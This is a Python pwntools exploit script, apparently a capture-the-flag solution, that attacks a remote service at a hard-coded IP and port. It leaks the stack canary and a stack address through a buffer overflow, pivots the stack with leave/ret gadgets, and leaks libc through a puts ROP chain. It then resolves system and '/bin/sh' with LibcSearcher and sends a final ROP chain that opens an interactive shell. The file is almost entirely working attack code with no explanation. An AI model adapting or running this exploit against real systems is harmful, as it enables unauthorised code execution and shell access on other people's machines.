from pwn import *
context.log_level='debug'
#p=process('./pwn')
p=remote('121.36.59.116',9999)
#raw_input()
#leak canary
p.recvuntil('>')
p.send('a'*88+'b')
p.recvuntil('a'*88)
canary=u64(p.recvn(8))-0x62
stack_addr=u64(p.recvn(6)+b'\x00'*2)
print("canary=>0x%x"%canary)
print("stack_addr=>0x%x"%stack_addr)
#move stack
elf=ELF('./pwn')
put_plt=elf.plt['puts']
read_got=elf.got['read']
#start=0x0000000000400630#text kaishi
#start=0x00400580 #init
start=0x000000040087B #main
pop_rdi=0x00400923
rbp_addr=stack_addr-0x10
leave_ret=0x400879 #leave ; ret
#puts(read_got)
rop=p64(137+8)+p64(pop_rdi)+p64(read_got)+p64(put_plt)+p64(start)
payload=rop+'a'*(88-len(rop))+p64(canary)+p64(rbp_addr-0x60)+p64(leave_ret)
p.recvuntil('>')
p.send(payload)
p.recvuntil('\n')
print("leak address now")
read_addr=u64(p.recvn(6)+b'\x00'*2)
print("read_addr=>0x%x"%read_addr)

#obtain system
from LibcSearcher import *
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

p.recvuntil('>')
p.send('a'*88)
p.recvuntil('>')

rbp_addr=rbp_addr-0x60-0x50
rop='k'*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+p64(start)
payload=rop+'a'*(88-len(rop))+p64(canary)+p64(rbp_addr)+p64(leave_ret)
p.send(payload)

'''
#first time
p.recvuntil('>')
p.send('a'*88+'b')
p.recvn(88)
canary=u64(p.recvn(8))-0x61
print("new_canary=>0x%x"%canary)
stack_addr=u64(p.recvn(6)+b'\x00'*2)#new
print("new_stack_addr=>0x%x"%stack_addr)
rbp_addr=stack_addr-0x10
#secondtime system('/bin/sh')
rop=p64(137+8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+p64(start)
payload=rop+'a'*(88-len(rop))+p64(canary)+p64(rbp_addr-0x60)+p64(leave_ret)
p.recvuntil('>')
p.sendline(payload)
'''
p.interactive()

